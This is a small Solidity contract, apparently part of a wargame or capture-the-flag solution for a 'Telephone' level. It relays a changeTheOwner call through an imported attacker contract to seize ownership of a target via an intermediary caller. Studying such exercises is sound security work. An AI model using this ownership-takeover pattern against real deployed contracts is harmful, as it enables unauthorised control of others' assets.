// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "contracts/TelephoneAttacker.sol";

contract TelephoneAttackerTwo {

    TelephoneAttacker public telephoneAttacker;
    constructor(address _telephoneAttacker){
        telephoneAttacker = TelephoneAttacker(_telephoneAttacker);
    }

    function changeTheOwner() public {
        telephoneAttacker.changeTheOwner(msg.sender);
    }
    
}